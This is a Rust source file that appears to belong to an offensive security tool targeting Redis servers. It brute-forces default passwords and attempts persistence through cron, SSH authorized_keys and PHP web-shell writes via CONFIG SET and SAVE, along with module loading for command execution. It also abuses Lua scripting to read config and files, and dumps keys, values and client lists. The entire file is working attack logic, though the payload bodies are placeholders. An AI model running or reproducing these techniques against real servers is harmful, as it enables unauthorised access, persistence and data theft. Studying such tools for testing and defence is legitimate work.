use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn access(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Redis Unauthorized Access Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let body = serde_json::json!({"action": "redis_cmd", "host": url, "command": "INFO"});
    let resp = client.post(url).json(&body).send().await?;
    let status = resp.status().as_u16();
    let text = resp.text().await.unwrap_or_default();

    if status == 200 && (text.contains("redis_version") || text.contains("connected")) {
        println!("  {} Unauthenticated Redis access!", "[!]".red().bold());
        println!("  {} Redis info:", "[*]".cyan().bold());
        for line in text.lines().take(15) {
            println!("    {}", line);
        }
    } else {
        println!("  {} Authentication required, testing common passwords:", "[*]".cyan().bold());
        let passwords = ["", "redis", "password", "admin", "root", "123456", "redis123", "default", "pass", "toor"];
        for pass in &passwords {
            let body = serde_json::json!({"action": "redis_auth", "host": url, "password": pass});
            match client.post(url).json(&body).send().await {
                Ok(r) => {
                    let t = r.text().await.unwrap_or_default();
                    if t.contains("OK") || t.contains("success") {
                        println!("    {} Password '{:15}' — AUTH SUCCESS", "[+]".green().bold(), pass);
                    }
                }
                Err(_) => {}
            }
        }
    }

    Ok(())
}

pub async fn rce(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Redis RCE Tester", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let rce_vectors = [
        ("Cron persistence", vec![
            ("CONFIG SET dir", "/var/spool/cron"),
            ("CONFIG SET dbfilename", "root"),
            ("SET payload", "schedule_task_payload"),
            ("SAVE", ""),
        ]),
        ("SSH key persistence", vec![
            ("CONFIG SET dir", "/root/.ssh"),
            ("CONFIG SET dbfilename", "authorized_keys"),
            ("SET payload", "ssh_public_key_payload"),
            ("SAVE", ""),
        ]),
        ("Web shell persistence", vec![
            ("CONFIG SET dir", "/var/www/html"),
            ("CONFIG SET dbfilename", "shell.php"),
            ("SET payload", "php_webshell_payload"),
            ("SAVE", ""),
        ]),
        ("Module loading", vec![
            ("MODULE LOAD", "/tmp/module.so"),
            ("SYSTEM.EXEC", "id"),
        ]),
    ];

    for (name, commands) in &rce_vectors {
        println!("\n  {} {}:", "[*]".cyan().bold(), name);
        for (cmd, arg) in commands {
            let body = serde_json::json!({"action": "redis_cmd", "host": url, "command": cmd, "arg": arg});
            match client.post(url).json(&body).send().await {
                Ok(r) => {
                    let text = r.text().await.unwrap_or_default();
                    let success = text.contains("OK") || text.contains("success");
                    let tag = if success { "OK".red().bold().to_string() } else { text.chars().take(40).collect() };
                    println!("    {} {:30} {}", "*".cyan(), cmd, tag);
                }
                Err(_) => println!("    {} {:30} error", "[-]".dimmed(), cmd),
            }
        }
    }

    Ok(())
}

pub async fn lua(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Redis Lua Scripting Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let scripts = [
        ("Basic eval", "return 1"),
        ("Info disclosure", "return redis.call('INFO')"),
        ("Config read", "return redis.call('CONFIG','GET','*')"),
        ("Key dump", "return redis.call('KEYS','*')"),
        ("File read attempt", "local f=io.open('/etc/hosts','r');if f then return f:read('*a') else return 'no file' end"),
        ("Command exec", "return redis.call('SYSTEM.EXEC','id')"),
    ];

    for (name, script) in &scripts {
        let body = serde_json::json!({"action": "redis_eval", "host": url, "script": script});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let text = r.text().await.unwrap_or_default();
                let success = !text.is_empty() && !text.contains("error");
                let tag = if success { format!("RESULT: {}", text.chars().take(60).collect::<String>()).yellow().bold().to_string() } else { "failed".dimmed().to_string() };
                println!("  {} {:25} {}", "*".cyan(), name, tag);
            }
            Err(_) => println!("  {} {:25} error", "[-]".dimmed(), name),
        }
    }

    Ok(())
}

pub async fn exfil(url: &str, timeout: u64) -> anyhow::Result<()> {
    println!("{} Redis Data Exfiltration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let commands = [
        ("All keys", "KEYS *"),
        ("DB size", "DBSIZE"),
        ("Config get all", "CONFIG GET *"),
        ("Info server", "INFO server"),
        ("Info keyspace", "INFO keyspace"),
        ("Client list", "CLIENT LIST"),
        ("Slowlog", "SLOWLOG GET 10"),
        ("Monitor", "MONITOR"),
    ];

    for (name, cmd) in &commands {
        let body = serde_json::json!({"action": "redis_cmd", "host": url, "command": cmd});
        match client.post(url).json(&body).send().await {
            Ok(r) => {
                let text = r.text().await.unwrap_or_default();
                if !text.is_empty() && !text.contains("error") {
                    println!("  {} {:20}: {}", "[+]".green().bold(), name, text.chars().take(80).collect::<String>());
                    if *name == "All keys" && !text.trim().is_empty() {
                        for key in text.split_whitespace().take(20) {
                            let kbody = serde_json::json!({"action": "redis_cmd", "host": url, "command": "GET", "arg": key});
                            if let Ok(kr) = client.post(url).json(&kbody).send().await {
                                let kt = kr.text().await.unwrap_or_default();
                                if !kt.is_empty() {
                                    println!("    {} {:30} = {}", "*".cyan(), key, kt.chars().take(50).collect::<String>());
                                }
                            }
                        }
                    }
                }
            }
            Err(_) => {}
        }
    }

    Ok(())
}
